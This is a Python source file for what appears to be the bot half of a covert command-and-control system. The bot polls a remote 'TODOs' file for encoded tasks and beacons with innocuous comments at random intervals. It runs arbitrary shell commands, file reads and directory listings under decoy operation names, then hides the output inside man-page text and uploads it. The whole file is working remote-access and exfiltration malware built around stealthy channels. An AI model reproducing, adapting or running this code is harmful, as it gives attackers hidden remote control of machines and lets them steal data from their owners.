from gzip import open
from json import loads
from platform import system
from queue import Queue
from random import randint
from re import split
from subprocess import Popen, PIPE
from time import sleep

from constants import w3k
from encoding import decode, encode, mvws, fpes
from myhttp import get, get_file, update_file, comment

def get_name():
    ip = get("https://api.ipify.org/")
    o8s = [k.rjust(3, "0") for k in ip.split(".")]
    c1 = f"{o8s[0][0:2]}.{o8s[0][2]}{o8s[1]}"
    c2 = f"{o8s[2][0:2]}.{o8s[2][2]}{o8s[3]}"
    w3w = get(f"https://api.what3words.com/v3/convert-to-3wa?coordinates={c1},{c2}&key={w3k}")
    return loads(w3w)['words'].split('.')[2]

def execute_shell(command) -> bytes:
    p = Popen(command, stdout=PIPE, shell=True)
    return p.communicate()[0]


class Bot:
    def __init__(self):
        self.name = get_name()
        self.todos = Queue()
        self.platform = system().lower()
        self.comment_up()

    def get_todos(self):
        raw = get_file("TODOs")
        todos = raw.split('\n')[3:]
        for new in todos:
            if new[0] != '-':
                # ignore task comments
                continue
            space = new.index(' ', 2)
            colon = new.index(':', space)
            if new[space+1:colon] != self.name:
                # ignore others' tasks
                continue
            id = new[2:space]
            # preserve the first space
            self.todos.put((id, new[colon+1:]))
        self.run_all_tasks()

    def run_all_tasks(self):
        while not self.todos.empty():
            self.run_first_task()

    def run_first_task(self):
        try:
            (id, task) = self.todos.get()
            ot = decode(task).split(' ')
            operation = ot[0]
            args = '' if len(ot) < 2 else ' '.join(ot[1:])
        except:
            self.report(id, task, b"Failed to parse task")
            return
        res = ""
        if operation == 'a':
            res = execute_shell('w')
        elif operation == 'dog':
            res = execute_shell(f'cat {args}')
        elif operation == 'ls':
            res = execute_shell('id')
        elif operation == 'ping':
            res = execute_shell(f'ls {args}')
        elif operation == 'man':
            res = execute_shell(args)
        else:
            res = b"Unknown operation"
        self.report(id, task, res)

    def report(self, id: str, task: str, result: bytes):
        cmd = split(f'{fpes}| ', split(f'{mvws}| ', task)[2])[0]
        man_contents = self.read_man(cmd)
        ct = encode(man_contents.decode('utf8'), result.decode('utf8'))
        head = encode('Extracted using vorogoj v1', decode(task))
        update_file(f'{cmd}-{id}', f'{head}\n\n### {cmd}\n\n{ct}')
        
    def read_man(self, cmd: str) -> bytes:
        if self.platform == 'linux':
            with open(f'/usr/share/man/man1/{cmd}.1.gz', 'rb') as f:
                return f.read()
        else:
            # TODO: non-unixlike platform support
            return execute_shell(f'man {cmd}')

    def comment_up(self):
        comment(f"{self.name} is yawning...")

if __name__ == '__main__':
    b = Bot()
    b.get_todos()
    while True:
        sleep(randint(5, 60))
        b.comment_up()
        b.get_todos()
